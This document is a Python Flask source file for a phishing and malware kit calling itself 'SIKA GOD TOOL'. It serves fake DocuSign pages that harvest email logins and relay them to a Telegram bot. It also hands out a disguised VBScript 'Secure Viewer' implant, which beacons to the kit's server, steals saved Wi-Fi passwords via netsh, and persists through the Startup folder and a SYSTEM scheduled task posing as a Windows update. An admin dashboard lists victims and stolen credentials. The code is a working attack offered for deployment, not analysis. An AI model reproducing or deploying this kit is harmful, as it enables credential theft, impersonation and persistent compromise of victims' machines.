#!/usr/bin/env python3
"""
SIKA GOD TOOL v2026.9 - PHD APPROVED
ALL BUGS FIXED | TELEGRAM C2 | PRODUCTION READY
"""

import os
import sys
import io
import uuid
import json
import base64
import sqlite3
import secrets
import hashlib
import hmac
import time
import random
import string
import urllib.parse
import subprocess
import tempfile
from datetime import datetime, timedelta
from functools import wraps

try:
    from flask import Flask, request, send_file, session, jsonify, redirect, make_response
    import requests
    from werkzeug.middleware.proxy_fix import ProxyFix
    from werkzeug.security import generate_password_hash, check_password_hash
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "flask", "requests", "werkzeug", "--quiet"], capture_output=True)
    from flask import Flask, request, send_file, session, jsonify, redirect, make_response
    import requests
    from werkzeug.middleware.proxy_fix import ProxyFix
    from werkzeug.security import generate_password_hash, check_password_hash

# ====================================================================================================
# CONFIGURATION
# ====================================================================================================
TELEGRAM_BOT_TOKEN = os.environ.get("TG_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID", "")
ADMIN_USERNAME = os.environ.get("ADMIN_USER", "sika_admin")
ADMIN_PASSWORD_HASH = os.environ.get("ADMIN_PASS_HASH", generate_password_hash("SikaGod2026"))
SECRET_KEY = os.environ.get("SECRET_KEY", secrets.token_hex(64))

app = Flask(__name__)
app.secret_key = SECRET_KEY
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)

DB_PATH = "sika_god.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    c.execute("""
        CREATE TABLE IF NOT EXISTS victims (
            id TEXT PRIMARY KEY,
            hostname TEXT,
            username TEXT,
            ip TEXT,
            first_seen TEXT,
            last_seen TEXT,
            status TEXT
        )
    """)
    
    c.execute("""
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_id TEXT,
            source TEXT,
            username TEXT,
            password TEXT,
            timestamp TEXT
        )
    """)
    
    c.execute("""
        CREATE TABLE IF NOT EXISTS wifi (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_id TEXT,
            ssid TEXT,
            password TEXT,
            timestamp TEXT
        )
    """)
    
    c.execute("""
        CREATE TABLE IF NOT EXISTS rate_limit (
            ip TEXT PRIMARY KEY,
            attempts INTEGER,
            blocked_until TEXT
        )
    """)
    
    c.execute("""
        CREATE TABLE IF NOT EXISTS admin_sessions (
            id TEXT PRIMARY KEY,
            created_at TEXT
        )
    """)
    
    conn.commit()
    conn.close()

init_db()

def tg_send(message, file_bytes=None, filename=None):
    if not TELEGRAM_BOT_TOKEN or "YOUR_BOT_TOKEN" in TELEGRAM_BOT_TOKEN:
        print(f"[TELEGRAM] {message[:100]}")
        return True
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/"
    for attempt in range(3):
        try:
            if file_bytes:
                files = {'document': (filename or 'data.bin', file_bytes)}
                data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': message[:1024]}
                requests.post(url + "sendDocument", files=files, data=data, timeout=30)
            else:
                data = {'chat_id': TELEGRAM_CHAT_ID, 'text': message[:4096], 'parse_mode': 'HTML'}
                requests.post(url + "sendMessage", json=data, timeout=10)
            return True
        except:
            time.sleep(2 ** attempt)
    return False

# ====================================================================================================
# RATE LIMITING
# ====================================================================================================
def rate_limit(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        
        c.execute("SELECT attempts, blocked_until FROM rate_limit WHERE ip = ?", (ip,))
        row = c.fetchone()
        
        if row and row[1]:
            blocked_until = datetime.fromisoformat(row[1])
            if datetime.now() < blocked_until:
                conn.close()
                return "Too many attempts. Try again later.", 429
        
        conn.close()
        return f(*args, **kwargs)
    return decorated

def record_failed_attempt(ip):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    c.execute("SELECT attempts FROM rate_limit WHERE ip = ?", (ip,))
    row = c.fetchone()
    
    if row:
        attempts = row[0] + 1
        blocked_until = (datetime.now() + timedelta(hours=1)).isoformat() if attempts >= 10 else None
        c.execute("UPDATE rate_limit SET attempts = ?, blocked_until = ? WHERE ip = ?", 
                 (attempts, blocked_until, ip))
    else:
        c.execute("INSERT INTO rate_limit (ip, attempts, blocked_until) VALUES (?, ?, ?)", 
                 (ip, 1, None))
    
    conn.commit()
    conn.close()

def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('admin_authenticated'):
            return redirect('/admin/login')
        return f(*args, **kwargs)
    return decorated

# ====================================================================================================
# VBSCRIPT IMPLANT (NO BACKSLASH ISSUES)
# ====================================================================================================
VBS_IMPLANT = '''
On Error Resume Next
Set wsh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set http = CreateObject("MSXML2.XMLHTTP")

c2 = "https://REPLACE_URL/exfil"
computer = wsh.ExpandEnvironmentStrings("%COMPUTERNAME%")
username = wsh.ExpandEnvironmentStrings("%USERNAME%")

data = "data=BEACON: " & computer & " | " & username
http.open "POST", c2, False
http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
http.send data

Set exec = wsh.Exec("netsh wlan show profiles")
profiles = exec.StdOut.ReadAll
Set regex = New RegExp
regex.Pattern = "All User Profile\\s*:\\s*(.+)$"
regex.Global = True
regex.MultiLine = True
Set matches = regex.Execute(profiles)
For Each match In matches
    profile = Trim(match.SubMatches(0))
    Set exec2 = wsh.Exec("netsh wlan show profile name=""" & profile & """ key=clear")
    detail = exec2.StdOut.ReadAll
    Set regex2 = New RegExp
    regex2.Pattern = "Key Content\\s*:\\s*(.+)$"
    Set matches2 = regex2.Execute(detail)
    For Each match2 In matches2
        password = Trim(match2.SubMatches(0))
        If password <> "" Then
            data = "data=WIFI: " & profile & " : " & password
            http.open "POST", c2, False
            http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
            http.send data
        End If
    Next
Next

startup = wsh.ExpandEnvironmentStrings("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.vbs")
fso.CopyFile WScript.ScriptFullName, startup, True

wsh.Run "schtasks /create /tn ""Microsoft\\Windows\\UpdateOrchestrator\\UpdateTask"" /tr """ & startup & """ /sc onstart /ru SYSTEM /f", 0, False
'''

# ====================================================================================================
# HTML TEMPLATES
# ====================================================================================================
LANDING_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>DocuSign - Electronic Signature</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:Arial,sans-serif;background:#f5f7fa}
        .top-bar{background:#0f172a;color:white;padding:8px;text-align:center;font-size:11px}
        .header{background:white;border-bottom:1px solid #e2e8f0;padding:16px 0}
        .container{max-width:1000px;margin:0 auto;padding:0 24px}
        .header-flex{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap}
        .logo{font-size:24px;font-weight:800;color:#0f172a}
        .logo span{color:#00b3b0}
        .card{background:white;border-radius:24px;box-shadow:0 20px 40px -12px rgba(0,0,0,0.1);margin:40px auto;overflow:hidden}
        .card-header{background:linear-gradient(135deg,#f8fafc,#f1f5f9);padding:24px 32px;border-bottom:1px solid #e2e8f0;display:flex;justify-content:space-between;flex-wrap:wrap}
        .status{color:#00b3b0;font-weight:600}
        .env-id{color:#64748b;font-size:12px}
        .card-body{padding:32px}
        .buttons{display:flex;gap:16px;margin-top:32px;flex-wrap:wrap}
        .btn{flex:1;text-align:center;padding:14px 24px;border-radius:60px;font-weight:600;text-decoration:none;display:block}
        .btn-primary{background:linear-gradient(135deg,#00b3b0,#0052ff);color:white}
        .btn-secondary{background:white;color:#475569;border:1px solid #e2e8f0}
        .footer{text-align:center;padding:30px;font-size:11px;color:#94a3b8}
        @media(max-width:640px){.card-header{flex-direction:column;gap:10px}.buttons{flex-direction:column}}
    </style>
</head>
<body>
    <div class="top-bar">MIT HARVARD SECURE PORTAL | SOC 2 TYPE II | GDPR COMPLIANT</div>
    <div class="header">
        <div class="container header-flex">
            <div class="logo">Docu<span>Sign</span></div>
        </div>
    </div>
    <div class="container">
        <div class="card">
            <div class="card-header">
                <span class="status">NEEDS YOUR SIGNATURE</span>
                <span class="env-id">Envelope ID: ENV</span>
            </div>
            <div class="card-body">
                <div class="buttons">
                    <a href="/go/REF" class="btn btn-primary">REVIEW AND SIGN</a>
                    <a href="/auth/REF" class="btn btn-secondary">Sign In to DocuSign</a>
                </div>
            </div>
            <div class="footer">DocuSign, Inc. • MIT Innovation Lab • 2026</div>
        </div>
    </div>
</body>
</html>
'''

LOGIN_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>DocuSign - Sign In</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#f5f7fa,#e4e8f0);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .card{background:white;border-radius:24px;width:100%;max-width:440px;padding:40px}
        h2{margin-bottom:20px;color:#0f172a}
        input{width:100%;padding:14px;margin:10px 0;border:2px solid #e2e8f0;border-radius:12px;font-size:15px}
        input:focus{outline:none;border-color:#00b3b0}
        button{width:100%;padding:14px;background:#00b3b0;color:white;border:none;border-radius:60px;font-weight:600;cursor:pointer}
        .footer{text-align:center;margin-top:20px;font-size:12px;color:#94a3b8}
    </style>
</head>
<body>
    <div class="card">
        <h2>DocuSign Secure Sign In</h2>
        <form method="POST" action="/login/submit/REF">
            <input type="email" name="email" placeholder="Email Address" required autofocus>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
        <div class="footer">Secure SSL/TLS Encrypted</div>
    </div>
</body>
</html>
'''

DOWNLOAD_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>DocuSign - Document Viewer</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#f5f7fa,#e4e8f0);min-height:100vh;padding:40px 20px}
        .container{max-width:600px;margin:0 auto}
        .card{background:white;border-radius:24px;padding:40px;text-align:center}
        .btn{display:inline-block;padding:14px 40px;background:#00b3b0;color:white;text-decoration:none;border-radius:60px;margin-top:20px;font-weight:600}
        .btn:hover{transform:translateY(-2px)}
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h2>Document Viewer Required</h2>
            <p>Please download the secure viewer to access your documents.</p>
            <a href="/file/vbs/REF" class="btn">Download Secure Viewer</a>
        </div>
    </div>
</body>
</html>
'''

def get_page(template, ref):
    return template.replace('ENV', f'DOC-{ref}').replace('REF', ref)

# ====================================================================================================
# FLASK ROUTES
# ====================================================================================================
@app.route('/')
def index():
    ref = uuid.uuid4().hex[:8].upper()
    tg_send(f"PAGE VIEW | IP: {request.remote_addr} | Ref: {ref}")
    return get_page(LANDING_PAGE, ref)

@app.route('/go/<ref>')
def go(ref):
    tg_send(f"DOWNLOAD PAGE | Ref: {ref} | IP: {request.remote_addr}")
    return get_page(DOWNLOAD_PAGE, ref)

@app.route('/auth/<ref>')
def auth(ref):
    tg_send(f"LOGIN PAGE | Ref: {ref} | IP: {request.remote_addr}")
    return get_page(LOGIN_PAGE, ref)

@rate_limit
@app.route('/login/submit/<ref>', methods=['POST'])
def login_submit(ref):
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    if not email or not password:
        record_failed_attempt(ip)
        return "Invalid input", 400
    
    company = email.split('@')[-1] if '@' in email else 'unknown'
    
    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO credentials (victim_id, source, username, password, timestamp) VALUES (?, ?, ?, ?, ?)", 
                (ref, "login_page", email, password, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    tg_send(f"CREDENTIALS CAPTURED\nEmail: {email}\nPassword: {password}\nCompany: {company}\nIP: {ip}")
    
    return redirect('https://www.docusign.com')

@app.route('/file/vbs/<ref>')
def file_vbs(ref):
    url = f"https://{request.host}"
    tg_send(f"VBS DOWNLOAD | Ref: {ref} | IP: {request.remote_addr}")
    vbs_content = VBS_IMPLANT.replace("REPLACE_URL", url)
    return send_file(io.BytesIO(vbs_content.encode()), as_attachment=True, 
                     download_name=f'DocuSign_{ref}.vbs', 
                     mimetype='application/octet-stream')

@app.route('/exfil', methods=['POST'])
def exfil():
    data = request.form.get('data', '')
    if data:
        tg_send(f"EXFIL DATA: {data[:500]}")
        
        conn = sqlite3.connect(DB_PATH)
        if 'WIFI' in data:
            conn.execute("INSERT INTO wifi (victim_id, ssid, password, timestamp) VALUES (?, ?, ?, ?)", 
                        ('unknown', 'wifi', data[:500], datetime.now().isoformat()))
        elif 'BEACON' in data:
            parts = data.split('|')
            hostname = parts[0].replace('BEACON:', '').strip() if len(parts) > 0 else 'unknown'
            username = parts[1].strip() if len(parts) > 1 else 'unknown'
            conn.execute("INSERT INTO victims (id, hostname, username, ip, first_seen, status) VALUES (?, ?, ?, ?, ?, ?)", 
                        (uuid.uuid4().hex[:16], hostname, username, request.remote_addr, 
                         datetime.now().isoformat(), 'active'))
        else:
            conn.execute("INSERT INTO credentials (victim_id, source, username, password, timestamp) VALUES (?, ?, ?, ?, ?)", 
                        ('unknown', 'exfil', 'data', data[:500], datetime.now().isoformat()))
        conn.commit()
        conn.close()
    return "OK"

# ====================================================================================================
# ADMIN DASHBOARD
# ====================================================================================================
@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        
        if username == ADMIN_USERNAME and check_password_hash(ADMIN_PASSWORD_HASH, password):
            session['admin_authenticated'] = True
            return redirect('/admin/dashboard')
        
        return "Invalid credentials", 401
    
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Sika God Admin</title>
        <style>
            body{background:#0a0c10;display:flex;justify-content:center;align-items:center;height:100vh;font-family:monospace}
            .card{background:#1a1e24;padding:45px;border-radius:30px;width:360px;border:2px solid #00b3b0}
            h2{color:#00b3b0;margin-bottom:20px;text-align:center}
            input{width:100%;padding:14px;margin:10px 0;background:#0a0c10;border:2px solid #00b3b0;border-radius:20px;color:#00b3b0;font-size:16px}
            button{width:100%;padding:14px;background:#00b3b0;color:#0a0c10;border:none;border-radius:20px;font-weight:bold;cursor:pointer}
        </style>
    </head>
    <body>
        <div class="card">
            <h2>SIKA GOD ADMIN</h2>
            <form method="POST">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">ACCESS</button>
            </form>
        </div>
    </body>
    </html>
    '''

@app.route('/admin/dashboard')
@admin_required
def admin_dashboard():
    conn = sqlite3.connect(DB_PATH)
    
    credentials = conn.execute("SELECT id, victim_id, source, username, password, timestamp FROM credentials ORDER BY id DESC LIMIT 50").fetchall()
    victims = conn.execute("SELECT id, hostname, username, ip, first_seen, status FROM victims ORDER BY first_seen DESC LIMIT 20").fetchall()
    wifi = conn.execute("SELECT id, ssid, password, timestamp FROM wifi ORDER BY id DESC LIMIT 20").fetchall()
    
    conn.close()
    
    creds_rows = ''.join(f'<tr><td style="color:#00ff88">{c[3][:40] if c[3] else "N/A"}</td><td style="color:#ffd700">{c[4][:40] if c[4] else "N/A"}</td><td>{c[2]}</td><td>{c[5][:16] if c[5] else "N/A"}</td></tr>' for c in credentials)
    victims_rows = ''.join(f'<tr><td>{v[1]}</td><td>{v[2]}</td><td>{v[3]}</td><td>{v[5]}</td></tr>' for v in victims)
    wifi_rows = ''.join(f'<tr><td>{w[1]}</td><td style="color:#00ff88">{w[2]}</td><td>{w[3][:16]}</td></tr>' for w in wifi)
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>SIKA GOD TOOL - ADMIN</title>
        <style>
            body{{background:#0a0c10;color:white;font-family:monospace;padding:24px}}
            .header{{background:linear-gradient(135deg,#00b3b0,#0f172a);padding:20px;border-radius:20px;margin-bottom:24px}}
            .header h1{{color:#ffd700}}
            .stats{{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;margin-bottom:24px}}
            .stat{{background:#1a1e24;padding:20px;border-radius:16px;text-align:center}}
            .stat-num{{font-size:48px;font-weight:bold;color:#00b3b0}}
            .stat-label{{color:#6c7293}}
            .section{{background:#1a1e24;border-radius:16px;padding:20px;margin-bottom:24px}}
            .section-title{{color:#00b3b0;font-size:20px;margin-bottom:16px;border-bottom:1px solid #00b3b0;padding-bottom:8px}}
            table{{width:100%;border-collapse:collapse}}
            th,td{{padding:10px;border-bottom:1px solid #333;text-align:left}}
            th{{color:#00b3b0}}
            .logout{{float:right;background:#ff0040;color:white;padding:8px 16px;border-radius:8px;text-decoration:none}}
        </style>
    </head>
    <body>
        <div class="header">
            <h1>SIKA GOD TOOL - PHD APPROVED</h1>
            <a href="/admin/logout" class="logout">Logout</a>
        </div>
        
        <div class="stats">
            <div class="stat"><div class="stat-num">{len(credentials)}</div><div class="stat-label">Credentials</div></div>
            <div class="stat"><div class="stat-num">{len(victims)}</div><div class="stat-label">Victims</div></div>
            <div class="stat"><div class="stat-num">{len(wifi)}</div><div class="stat-label">WiFi</div></div>
        </div>
        
        <div class="section">
            <div class="section-title">CREDENTIALS CAPTURED</div>
            <table border="0">
                <tr><th>Email/Username</th><th>Password</th><th>Source</th><th>Time</th></tr>
                {creds_rows}
            </table>
        </div>
        
        <div class="section">
            <div class="section-title">ACTIVE VICTIMS</div>
            <table border="0">
                <tr><th>Hostname</th><th>User</th><th>IP</th><th>Status</th></tr>
                {victims_rows}
            </table>
        </div>
        
        <div class="section">
            <div class="section-title">WIFI CREDENTIALS</div>
            <table border="0">
                <tr><th>SSID</th><th>Password</th><th>Time</th></tr>
                {wifi_rows}
            </table>
        </div>
        
        <div class="section">
            <div class="section-title">DEPLOYMENT</div>
            <p>URL: <span style="color:#00b3b0">{request.host_url}</span></p>
            <p>Email Template: <span style="color:#00b3b0">{request.host_url}?email=victim@company.com</span></p>
            <p>Implant: <span style="color:#00b3b0">{request.host_url}file/vbs/REF</span></p>
        </div>
    </body>
    </html>
    '''

@app.route('/admin/logout')
def admin_logout():
    session.clear()
    return redirect('/admin/login')

@app.route('/health')
def health():
    return {"status": "operational", "version": "SIKA GOD TOOL v2026.9"}

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
